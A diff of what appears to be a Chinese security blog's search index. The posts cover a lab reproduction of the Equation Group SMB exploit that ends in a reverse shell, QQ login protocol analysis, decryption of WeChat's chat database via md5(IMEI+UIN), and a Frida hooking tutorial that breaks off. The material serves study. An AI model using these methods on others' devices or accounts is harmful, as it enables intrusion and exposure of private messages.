+<p>在XP上输入dll文件的位置，一路回车<br><img src="/2017/04/15/方程式漏洞利用之SMB/操作7.png" alt="操作7"><br>显示Doublepulsar Succeeded<br><img src="/2017/04/15/方程式漏洞利用之SMB/操作8.png" alt="操作8"></p>
+<p>查看kali上发现已经反弹shell 了<br><img src="/2017/04/15/方程式漏洞利用之SMB/成功反弹.png" alt="成功反弹"></p>
+<h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>现在网上已经有很多文章了，这里只是自己验证一下实现的过程，记录一下。其实复现也很容易，只需要输入IP地址和一些选项即可，就是搭建环境的时候有许多错误，注意一下就行了。<br>这里有视频可以看一下<a href="https://v.qq.com/iframe/player.html?vid=g0393qtgvj0&amp;tiny=0&amp;auto=0" target="_blank" rel="external">https://v.qq.com/iframe/player.html?vid=g0393qtgvj0&amp;tiny=0&amp;auto=0</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> Exploit </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 方程式 </tag>
+            
+            <tag> SMB漏洞 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[QQ登录简单分析，附易语言登录代码]]></title>
+      <url>/2017/04/10/QQ%E7%99%BB%E5%BD%95%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%EF%BC%8C%E9%99%84%E6%98%93%E8%AF%AD%E8%A8%80%E7%99%BB%E5%BD%95%E4%BB%A3%E7%A0%81/</url>
+      <content type="html"><![CDATA[<p>这里参考了QQ登录的组件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=0&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=636014201&amp;target=self&amp;s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm</div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p><img src="/2017/04/10/QQ登录简单分析，附易语言登录代码/登录组件.png" alt="登录组件"></p>
+<p>QQ登录有两种情况，一种是需要验证码，一种是不需要验证码。需要验证码的稍微复杂一点，这里首先介绍一下不需要验证码的情况。</p>
+<h3 id="一、无需验证码"><a href="#一、无需验证码" class="headerlink" title="一、无需验证码"></a>一、无需验证码</h3><h4 id="第一步：获取-login-sig"><a href="#第一步：获取-login-sig" class="headerlink" title="第一步：获取 login_sig"></a>第一步：获取 login_sig</h4><p>这是登录所需要的第一步，无论是否需要验证码，都需要进行这一步。<br>访问如下地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=0&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=636014201&amp;target=self&amp;s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm</div></pre></td></tr></table></figure></p>
+<p>从返回的Cookie中获取 pt_login_sig的值，这个值就是login_sig</p>
+<p><img src="/2017/04/10/QQ登录简单分析，附易语言登录代码/获取login_sig的值.png" alt="获取login_sig的值"></p>
+<h4 id="第二步：获取-checkVC"><a href="#第二步：获取-checkVC" class="headerlink" title="第二步：获取 checkVC"></a>第二步：获取 checkVC</h4><p>这个字符串中包含了多个内容。有是否输入验证码的标志、verifycode、salt和pt_verifysession_v1（<strong>不需要输入验证码的情况下</strong>）。<br>请求地址：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://check.ptlogin2.qq.com/check?regmaster=&amp;pt_tea=2&amp;pt_vcode=1&amp;uin=QQ号码&amp;appid=636014201&amp;js_ver=10197&amp;js_type=1&amp;login_sig=GsmtnCcla5xHKS********T0U0npqlnD4bzXEMed&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;r=0.23528769960244944&amp;pt_uistyle=40</div></pre></td></tr></table></figure>
+<p>其中参数uin是登录的qq号码，login_sig是从第一步获取的值。<br><img src="/2017/04/10/QQ登录简单分析，附易语言登录代码/获取check_vc.png" alt="获取check_vc"><br>当然这种情况是在QQ号输入正确，并且不需要输入验证码时。<br>返回的内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ptui_checkVC(&apos;0&apos;,&apos;!BAF&apos;,&apos;\x00******\x64\x21\x97\x92&apos;,&apos;e9825f1e232302e01414bf9c37ac7d44942a40c89daaf5604ab11d54fff32445ad89e315e30a610e0aa77f46afedbaad83819c14230e7ec2&apos;,&apos;2&apos;);</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>第一个值表示是否需要图片验证码，0表示不需要<br>    第二值是verifycode，登录时需要<br>    第三个值是salt，QQ转换而来<br>    第四个值是pt_verifysession_v1</p>
+</blockquote>
+<h4 id="第三步：登录"><a href="#第三步：登录" class="headerlink" title="第三步：登录"></a>第三步：登录</h4><p>输入密码后点登录，请求包为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ptlogin2.qq.com/login?u=QQ号码&amp;verifycode=!BAF&amp;pt_vcode_v1=0&amp;pt_verifysession_v1=e9825f1e232302e01414bf9c37ac7d44942a40c89daaf5604ab11d54fff32445ad89e315e30a610e0aa77f46afedbaad83819c14230e7ec2&amp;p=w79Tqqx2glOF9meNNWhz5Ouow23EGt3zEl-y8vpVGFuHT6HJaFtRhVDlbpMj4a6plyrnIvW73uGXzVDwSt2e9wMHyFt9crtZ-N0xUx2wxFUen03ybw5HxzkPti3VyjSffID8GNkhDn1yYVPa1lyjHED2DCVd3rl9bysBPb*1imLSYY3jkQJpsXPS2kjxxlVxFBVHEHnSGSYaA3QBMXQ*NyQw7MkhVDsO7X8aljR0eApa*lgHoBsC4g3mTtEKcU5aslpcO4EPdUey0QA4YVh9zLzbLnkPJklcQYvoxlv6kLdYmoyORcVTM6IKqles7t5ot0mRWzjW923hV3X0PLRb6g__&amp;pt_randsalt=2&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;ptredirect=0&amp;h=1&amp;t=1&amp;g=1&amp;from_ui=1&amp;ptlang=2052&amp;action=4-8-1488010172151&amp;js_ver=10197&amp;js_type=1&amp;login_sig=GsmtnCcla5xHKSrRZ7ek0VU5-63oyUvqLk65vxoIG0kOFBT0U0npqlnD4bzXEMed&amp;pt_uistyle=40&amp;aid=636014201&amp;</div></pre></td></tr></table></figure></p>
+<table>
+<thead>
+<tr>
+<th>参数名称</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>u</td>
+<td>用户输入。第二步骤中  uin的值</td>
+</tr>
+<tr>
+<td>verifycode</td>
+<td>第二步中ptui_checkVC第二个值。(这里的是!BAF)</td>
+</tr>
+<tr>
+<td>pt_verifysession_v1</td>
+<td>第二步中ptui_checkVC第四个值。即e9825f1….</td>
+</tr>
+<tr>
+<td>p</td>
+<td>加密后的密码</td>
+</tr>
+<tr>
+<td>login_sig</td>
+<td>第一步中返回Cookie中的 pt_login_sig值</td>
+</tr>
+<tr>
+<td>pt_randsalt</td>
+<td>pt_randsalt=0  旧版加密 ；pt_randsalt=2 新版RSA加密</td>
+</tr>
+</tbody>
+</table>
+<p>密码加密的js代码地址<code>http://imgcache.qq.com/ptlogin/ver/10197/js/c_login_2.js</code>，注意看js版本，这里是js_ver为10197</p>
+<blockquote>
+<p>密码加密需要三个参数，第一个是pwd（用户密码），第二个是salt（第二步中获取ptui_checkVC 中的第三个值），第三个是verifycode（第二步中ptui_checkVC第二个值 ）</p>
+</blockquote>
+<p>用户名密码正确返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ptuiCB(&apos;0&apos;,&apos;0&apos;,&apos;http://www.qq.com/qq2012/loginSuccess.htm&apos;,&apos;0&apos;,&apos;登录成功！&apos;, &apos;QQ昵称&apos;);</div></pre></td></tr></table></figure></p>
+<p>用户名密码错误返回：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ptuiCB(&apos;3&apos;,&apos;0&apos;,&apos;&apos;,&apos;0&apos;,&apos;您输入的帐号或密码不正确，请重新输入。&apos;, &apos;&apos;);</div></pre></td></tr></table></figure>
+<p>附上一张登录成功的截图<br><img src="/2017/04/10/QQ登录简单分析，附易语言登录代码/无验证码登录成功.png" alt="无验证码登录成功"></p>
+<h3 id="二、需要输入验证码"><a href="#二、需要输入验证码" class="headerlink" title="二、需要输入验证码"></a>二、需要输入验证码</h3><h4 id="第一步：获取login-sig"><a href="#第一步：获取login-sig" class="headerlink" title="第一步：获取login_sig"></a>第一步：获取login_sig</h4><p>与上面无需验证码一样，就省略了。</p>
+<h4 id="第二步：获取cap-cd"><a href="#第二步：获取cap-cd" class="headerlink" title="第二步：获取cap_cd"></a>第二步：获取cap_cd</h4><p>请求：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://check.ptlogin2.qq.com/check?regmaster=&amp;pt_tea=2&amp;pt_vcode=1&amp;uin=987654321&amp;appid=636014201&amp;js_ver=10197&amp;js_type=1&amp;login_sig=KVSX9JmFKqCXlNi85SLXJnj5DqKPDzAYGwW3X5d3Wcnxd885YPFSeDU7ul15aTQp&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;r=0.8539291708517738&amp;pt_uistyle=40</div></pre></td></tr></table></figure></p>
+<p>返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ptui_checkVC(&apos;1&apos;,&apos;yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&apos;,&apos;\x00\x00\x00\x00\x3a\xde\x68\xb1&apos;,&apos;&apos;,&apos;2&apos;);</div></pre></td></tr></table></figure></p>
+<p>cap_cd的值为<code>yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**</code></p>
+<h4 id="第三步：获取sess"><a href="#第三步：获取sess" class="headerlink" title="第三步：获取sess"></a>第三步：获取sess</h4><p>请求：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://captcha.qq.com/cap_union_new_gettype?aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;uid=987654321&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;callback=_aq_453849</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>uid是qq号，cap_cd由第二步获取</p>
+</blockquote>
+<p>返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">_aq_453849(&#123;&quot;capclass&quot;:&quot;0&quot;,&quot;subcapclass&quot;:&quot;0&quot;,&quot;src&quot;:&quot;cap_union_new_show&quot;,&quot;sess&quot;:&quot;XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&quot;&#125;)</div></pre></td></tr></table></figure></p>
+<h4 id="第四步：获取visg"><a href="#第四步：获取visg" class="headerlink" title="第四步：获取visg"></a>第四步：获取visg</h4><p>请求：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://captcha.qq.com/cap_union_new_show?aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&amp;noBorder=noborder&amp;showtype=embed&amp;uid=987654321&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;rnd=925999</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/04/10/QQ登录简单分析，附易语言登录代码/获取visg.png" alt="获取visg"></p>
+<h4 id="第五步：获取图片验证码"><a href="#第五步：获取图片验证码" class="headerlink" title="第五步：获取图片验证码"></a>第五步：获取图片验证码</h4><p>访问地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://captcha.qq.com/cap_union_new_getcapbysig?aid=549000912&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=” ＋ sess ＋ “&amp;noBorder=noborder&amp;showtype=embed&amp;uid=” ＋ uin ＋ “&amp;cap_cd=” ＋ cap_cd ＋ “&amp;lang=2052&amp;rnd=117715&amp;rand=0.5497459754332915&amp;vsig=” ＋ vsig ＋ “&amp;ischartype=1</div></pre></td></tr></table></figure></p>
+<h4 id="第六步：验证验证码，获取verifycode和pt-verifysession-v1"><a href="#第六步：验证验证码，获取verifycode和pt-verifysession-v1" class="headerlink" title="第六步：验证验证码，获取verifycode和pt_verifysession_v1"></a>第六步：验证验证码，获取verifycode和pt_verifysession_v1</h4><p>post请求：<br><code>http://captcha.qq.com/cap_union_new_verify?random=1488013134675</code></p>
+<p>提交内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&amp;noBorder=noborder&amp;showtype=embed&amp;uid=QQ号码&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;rnd=925999&amp;subcapclass=0&amp;vsig=g3GflfnCicbaqub3e-SVo2azImuo1gDzQfnGkRnhI-uqLlIXtY6XyXE1dDjUBJHOXCPewnnTo-4mPTtRjScTD9uZaPu4z3x1Jj6inepPQ8l8KCeFeN9laBpiWdqaOF4Eg&amp;cdata=0&amp;collect=OD6q9t0AraWJf%2Bdtq0j8VvuOrjmT8T%2F%2FW8E83RE208unUG0TO1T5psMsZH1p5SXS12WpjU2CcGKHMsp7fciMTLiLY3wUwJBjBxWSqfu%2FbhfCTKUtJdBPeE6P%2FsRfdwemWRYRQwRgdvXZuc42JOqfDIfD%2F2%2B2GeYYxOPohbqY%2BWcW%2Fcut%2BGLcKpJGFTzBtPzKDLU6fTPn6MC%2FNiRGWGehwTy52MK0dIVdd5BYlPQrhFrvrhaisRISHiH%2FhViF7iFpZm5ZclBD5rjqQ4r1O8%2BBDRSB4feMaP2S1Usd0uGrMnVFT8zX7dV7sT2Y1NQ%2Fk5%2FHP%2BgzBQgHMLuH%2FqdSBz%2Fu9wr7oT6Xb0edOUBjPrw55yhZM1R%2FxEJSNwap2f77XRxbJWH%2BFtEuWBC2Gve3MIn9L9loCqk%2Fe0XoGGy%2FuEDvHfEHRCchzaWKH3Hlr5MehOI4WaaPgmbj%2BBeSbcY%2BmDIc1TJ%2BhQmsRf5DoqlqiCuKNQLuX1XS1e3cnfM3%2BonkBImxaqx%2BlTG0HxWAV0Ntsn%2B0%2BeErZleVNI9VIZgIOHDxNkiaG3BucPL1SRuPNtgcNgGFpvYmFqTqPrR%2FgYDPobzlxy%2FcMVEALYB%2FogbH4gy%2FZP7xczjXypgdvtTawokxTUopmKyXVCwvA0coEQzWLW1EQfMsWPNZcA2p58oaelGA3FBlgkZ2iUnx4qukKEZQ7vKFie8VKFBelfNSp6aXcezYbnDbeFHYOAvLeXPriaZ5qBQzNADUtyj%2FhTsY%2BbvmnwCAGT%2F%2BMYeyd9VFWPEbR8cj%2FrRDEEWc0wdd5BOoHzix%2Bz2U<span class="keyword">if</span>9512VwHn9%2Bp3KXAnrK1O%2FQ6HRB7YS9BPyYQvW9ZtpvvKBwOIjf3fx7aqwYqfa7VUzMGv3zkvVA8Bp2JHG2GoQxnVa62ymP3SGshxS4l86ParjFNvepN16O1VaPAidFvqHRXAP14tHMkeC8VTFuqp5cKAY4UdXpPXukOvXPySbdFSPaaAqfIv7%2BckjxFsUPS4cauOx2jif2fQU2maxErLnwrZ10natNklynu5sUn9RSuRDld9v4TNTbyPShDdijM%2BzvpJoMyr4GWiFthB0kZZ2lVnPoqV67VQ%2FPiyCUA9zVbrLSAEOKIz1HQ19I0hdH41fBUPL824xYMdIO1AlZJKGre%2FCvUEgXaHgvbe83QNtFw%2BU946tlGVwR9TCCPltakqyKrT%2F8CtCZ6Mi0qfmFYnF8D7zZBaKxbNgTmMjvwAyz%2F0dMsDi97scJLMYV4w%2Fosk6gvoHEeX6LkbXh5W0aTYTznTSfO2RVfgzWpPiks6rVGzLhfwDyFAyH7%2FOHD7qEWGjnX3fTiBnw5%2FHWqHPJh3Kd%2F4EGe1yE3ZGzxo%2BPETGbcLQaQiiSAaQiFsU5UDoWG1%2FfOjd1Lkjg8D%2FNXuS1BkncxI2Hk%2B4xL0Xa1STqWJGieeyB5DOT9cHYUxEpw1g%3D&amp;ans=ywhm</div></pre></td></tr></table></figure></p>
+<p>验证码输入正确返回：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">"errorCode"</span>:<span class="string">"0"</span> , <span class="string">"randstr"</span> : <span class="string">"@mDo"</span> , <span class="string">"ticket"</span> : <span class="string">"t026Dii9p2HtKBiYgHwRpwqXFrwWsI3-tta5rc7J3ELr5VgnaORdHXceHsZpmOl6JGRkEQYtUoeJs8KXWym7a0cxuw07929umE9cPo16UNyimo*"</span> , <span class="string">"errMessage"</span>:<span class="string">"OK"</span>&#125;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>verifycode为randstr，pt_verifysession_v1为ticket</p>
+</blockquote>
+<h4 id="第七步：-验证用户名密码是否正确"><a href="#第七步：-验证用户名密码是否正确" class="headerlink" title="第七步： 验证用户名密码是否正确"></a>第七步： 验证用户名密码是否正确</h4><p>请求：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ptlogin2.qq.com/login?u=987654321&amp;verifycode=@mDo&amp;pt_vcode_v1=1&amp;pt_verifysession_v1=t026Dii9p2HtKBiYgHwRpwqXFrwWsI3-tta5rc7J3ELr5VgnaORdHXceHsZpmOl6JGRkEQYtUoeJs8KXWym7a0cxuw07929umE9cPo16UNyimo*&amp;p=A*CEx2PsoaZAYQe7D-5dLmTxdorqI9asO37Wugp2KFHzeEqYpMPh9CHPk7DDzZw5UzD4y1<span class="keyword">in</span>-ZrSoXLx5kJYe1WGZ7sqhg*ZNJ3DtQ65rXR*I5i*dCAQ-h1fFV*u3AdP8IFAAu*borH*xSYbFZDTQ8TjplD2wan2w8MnDfo3h1AyUL*kpt79FqpCfuXnlaSOyTOzkMceEQczxw5DYzmZDetbMeJMYhoqLhQ0WHxbHUafhOEk1EhBDiqXvfETJvCmSMubGN7W*LIF3JPoYFDOgJmmPWqauGvw7C03ehesfIzeNtm-m5R*QX8HyM4dPp*dc3lRUxF2rMuBPn9EVzaqpg__&amp;pt_randsalt=2&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;ptredirect=0&amp;h=1&amp;t=1&amp;g=1&amp;from_ui=1&amp;ptlang=2052&amp;action=5-24-1488013134992&amp;js_ver=10197&amp;js_type=1&amp;login_sig=KVSX9JmFKqCXlNi85SLXJnj5DqKPDzAYGwW3X5d3Wcnxd885YPFSeDU7ul15aTQp&amp;pt_uistyle=40&amp;aid=636014201&amp;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>带验证码登录可能存在问题，待修改</p>
+</blockquote>
+<p><a href="http://fuping.site/2017/04/10/QQ登录简单分析，附易语言登录代码/QQLogin.e">易语言实现代码</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 编程开发 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> QQ登录 </tag>
+            
+            <tag> 易语言 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[微信聊天记录读取]]></title>
+      <url>/2017/04/09/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E8%AF%BB%E5%8F%96/</url>
+      <content type="html"><![CDATA[<p>根据<a href="http://blog.csdn.net/jiangwei0910410003/article/details/52238891" target="_blank" rel="external">四哥</a>教程来自己动手实现一下如何读取微信的聊天记录。以下操作需要在手机Root的情况下进行。<br><a id="more"></a></p>
+<h3 id="微信聊天记录保存位置"><a href="#微信聊天记录保存位置" class="headerlink" title="微信聊天记录保存位置"></a>微信聊天记录保存位置</h3><p>微信聊天记录的数据库文件保存在<code>/data/data/com.tencent.mm/MicroMsg/32位字符串/</code>中，名字为<code>EnMicroMsg.db</code>。</p>
+<p><img src="/2017/04/09/微信聊天记录读取/微信数据库文件位置.png" alt="微信数据库文件位置"></p>
+<h3 id="将聊天记录数据库文件导出"><a href="#将聊天记录数据库文件导出" class="headerlink" title="将聊天记录数据库文件导出"></a>将聊天记录数据库文件导出</h3><p>使用命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb pull /data/data/com.tencent.mm/MicroMsg/32位字符串/EnMicroMsg.db</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/04/09/微信聊天记录读取/导出1.png" alt="导出1"><br>直接导出提示不存在，因为是权限的问题。<br>使用adb root没反应，只好将文件copy到一个非root权限可以操作的目录，这里采用了<code>/data/local/tmp</code>文件夹。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp EnMicroMsg.db /data/<span class="built_in">local</span>/tmp/</div></pre></td></tr></table></figure></p>
+<p>然后导出，执行命令<code>adb pull /data/local/tmp/EnMicroMsg.db</code></p>
+<p><img src="/2017/04/09/微信聊天记录读取/权限不足.png" alt="权限不足"></p>
+<p>提示权限不足，修改权限后导出。</p>
+<p><img src="/2017/04/09/微信聊天记录读取/修改权限导出.png" alt="修改权限导出"></p>
+<h3 id="查看SharedPreferences中保存的UIN的值"><a href="#查看SharedPreferences中保存的UIN的值" class="headerlink" title="查看SharedPreferences中保存的UIN的值"></a>查看SharedPreferences中保存的UIN的值</h3><p>切换到<code>/data/data/com.tencent.mm/shared_prefs</code>目录，然后执行<code>grep -rn &quot;uin&quot; *</code>来查看保存的UIN的值</p>
+<p><img src="/2017/04/09/微信聊天记录读取/Shared_Pre文件.png" alt="Shared_Pre文件"><br><img src="/2017/04/09/微信聊天记录读取/查看UIN的值.png" alt="查看UIN的值"></p>
+<h3 id="读取微信数据库文件内容"><a href="#读取微信数据库文件内容" class="headerlink" title="读取微信数据库文件内容"></a>读取微信数据库文件内容</h3><p>将手机的IMEI和微信用户UIN值进行拼接后进行md5加密，取小写md5的前七位就是微信数据库的密码。<br>用Navicat读取数据库文件是提示错误：<br><img src="/2017/04/09/微信聊天记录读取/Navicat读取数据库文件时提示错误.png" alt="Navicat读取数据库文件时提示错误"><br>这是因为微信数据库用的是SQLCipher开源库提供的加密解密算法，读取数据库文件需要使用SQLCipher这个软件。<br>打开后输入密码，即可看到聊天内容：<br><img src="/2017/04/09/微信聊天记录读取/微信聊天记录.png" alt="微信聊天记录"></p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://blog.csdn.net/jiangwei0910410003/article/details/52238891" target="_blank" rel="external">http://blog.csdn.net/jiangwei0910410003/article/details/52238891</a> </p>
+]]></content>
+      
+        <categories>
+            
+            <category> Android技术 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 微信聊天记录 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Android HOOK 技术之Frida的初级使用]]></title>
+      <url>/2017/04/01/Android-HOOK-%E6%8A%80%E6%9C%AF%E4%B9%8BFrida%E7%9A%84%E5%88%9D%E7%BA%A7%E4%BD%BF%E7%94%A8/</url>
+      <content type="html"><![CDATA[<p><strong>Frida</strong>是一款基于Python + JavaScript 的Hook与调试框架，在Android\Linux\Windows等平台均能使用。这里我们以<strong>Windows</strong>来对Android应用程序进行Hook。Frida的官网地址是：<a href="https://www.frida.re。" target="_blank" rel="external">https://www.frida.re。</a></p>
+<a id="more"></a>
+<h2 id="Windows下Frida的安装"><a href="#Windows下Frida的安装" class="headerlink" title="Windows下Frida的安装"></a>Windows下Frida的安装</h2><blockquote>
+<p>有多种安装方法，这里提供两种，第一种直接使用pip安装，第二种是下载egg文件安装</p>
+</blockquote>
+<h3 id="1-通过pip安装Frida"><a href="#1-通过pip安装Frida" class="headerlink" title="1.通过pip安装Frida"></a>1.通过pip安装Frida</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install frida</div></pre></td></tr></table></figure>
+<h3 id="2-去下载对应平台的egg安装包进行安装"><a href="#2-去下载对应平台的egg安装包进行安装" class="headerlink" title="2.去下载对应平台的egg安装包进行安装"></a>2.去下载对应平台的egg安装包进行安装</h3><p>下载地址：<a href="https://pypi.python.org/pypi/frida" target="_blank" rel="external">https://pypi.python.org/pypi/frida</a><br>当前最新版本为<strong>9.1.23</strong>，下载对应平台和Python版本的安装包，例如我的系统为Win64，Python为2.7，下载的文件为<strong>frida-9.1.23-py2.7-win-amd64.egg</strong>。下载后安装即可。</p>
+<blockquote>
+<p>由于网络原因，方法1安装时间太久，这里推荐第二种方法。</p>
+</blockquote>
+<p>安装完成后在Dos窗口输入命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">frida-ps</div></pre></td></tr></table></figure></p>
+<p>出现类似以下的界面表示安装成功。</p>
+<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/frida-ps.png" alt="frida-ps"></p>
+<h2 id="Android下Frida环境的搭建"><a href="#Android下Frida环境的搭建" class="headerlink" title="Android下Frida环境的搭建"></a>Android下Frida环境的搭建</h2><blockquote>
+<p>要求：一部Root过的手机或模拟器，最好采用4.4 ARM系统。PS：我真机采用的是魅族4的5.1系统，有些功能实现不了，只好用模拟器来完成。模拟器的具体配置如下图所示。</p>
+</blockquote>
+<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/模拟器配置.png" alt="模拟器配置"></p>
+<p>首先需用下载最新的frida-server，下载地址为：<a href="http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。" target="_blank" rel="external">http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。</a><br>下载后将文件上传到手机中，并赋予执行权限。上传到手机使用如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb push frida-server /data/local/tmp/</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/adb push.png" alt="adb push"></p>
+<p>将frida-server赋予执行权限，命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">adb shell</div><div class="line">su</div><div class="line">cd /data/local/tmp/</div><div class="line">chmod 777 frida-server</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/运行Frida-Server.png" alt="运行Frida-Server"></p>
+<p>运行Frida-Server<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./data/local/tmp/frida-server</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/运行Frida-Server结果.png" alt="运行Frida-Server结果"></p>
+<p>执行frida-ps -U可以看到手机上的进程</p>
+<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/手机进程.png" alt="手机进程"></p>
+<blockquote>
+<p>使用frida-ps -R 也可以，但是需要进行转发。执行<code>adb forward tcp:27042 tcp:27042</code>后执行<code>frida-ps -R</code>也可以看到手机上的进程</p>
+</blockquote>
+<p>至此，准备工作已经做好，现在来进行对Android上的程序进行Hook了。<br>首先以WX的掷骰子和猜拳头为例。这里采用最新版的WX（<strong>6.5.7</strong>）。<br>其代码如下所示：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div 